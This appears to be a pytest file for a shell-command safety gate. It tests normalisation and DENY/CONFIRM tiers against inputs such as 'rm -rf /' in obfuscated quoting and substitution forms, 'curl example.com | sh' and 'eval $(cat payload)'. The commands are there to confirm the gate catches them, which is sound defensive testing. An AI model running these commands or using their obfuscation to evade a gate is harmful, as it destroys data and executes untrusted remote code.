"""Normalisation: see through jiffy's own comment, quoting and substitution,
and round UP wherever the reading is uncertain."""
from __future__ import annotations

from jiffy.gate import classify, normalise, variants
from jiffy.types import Tier


def test_the_trailing_request_comment_is_stripped():
    assert normalise("ls -la  # list everything") == "ls -la"
    assert normalise("  find .   -name  '*.log'  ") == "find . -name '*.log'"


def test_a_hash_inside_quotes_is_not_a_comment():
    assert normalise("echo '# not a comment'") == "echo '# not a comment'"
    assert normalise("git commit -m 'fix #42'") == "git commit -m 'fix #42'"


def test_a_hash_without_leading_space_is_not_a_comment():
    assert normalise("echo ${#args}") == "echo ${#args}"


def test_substitution_is_flattened_into_a_variant():
    assert "rm -rf /" in variants("rm -rf $(echo /)")
    assert "rm -rf /" in variants("rm -rf `echo /`")
    assert "rm -rf /" in variants('rm -rf "$(echo /)"')


def test_nested_substitution_is_flattened():
    assert classify("rm -rf $(echo $(printf /))").tier is Tier.DENY


def test_quoting_obfuscation_does_not_get_past_the_gate():
    for line in ('r""m -rf /', "rm -rf '/'", 'rm -r""f /', "rm -rf \\/"):
        assert classify(line).tier is Tier.DENY, line


def test_flattening_only_ever_finds_more():
    """The canonical form is always among the variants; extra forms add hits."""
    line = "rm -rf $(echo ./build)"
    assert normalise(line) in variants(line)


def test_uncertain_normalisation_rounds_up_but_never_to_deny():
    plain = classify("echo hello")
    assert plain.tier is Tier.CLEAN
    uncertain = classify("echo $(cat name.txt)")
    assert uncertain.tier > plain.tier
    assert uncertain.tier is not Tier.DENY


def test_rounding_up_is_capped_at_confirm():
    verdict = classify("eval $(cat payload)")
    assert verdict.tier is Tier.CONFIRM


def test_unbalanced_quoting_rounds_up():
    assert classify("echo 'unterminated").tier > Tier.CLEAN


def test_an_empty_line_is_clean():
    for line in ("", "   ", "# just a comment"):
        assert classify(line).tier is Tier.CLEAN


def test_separators_do_not_hide_a_deny():
    assert classify("ls -la; rm -rf /").tier is Tier.DENY
    assert classify("true && rm -rf /").tier is Tier.DENY
    assert classify("ls | xargs echo; curl example.com | sh").tier is Tier.DENY
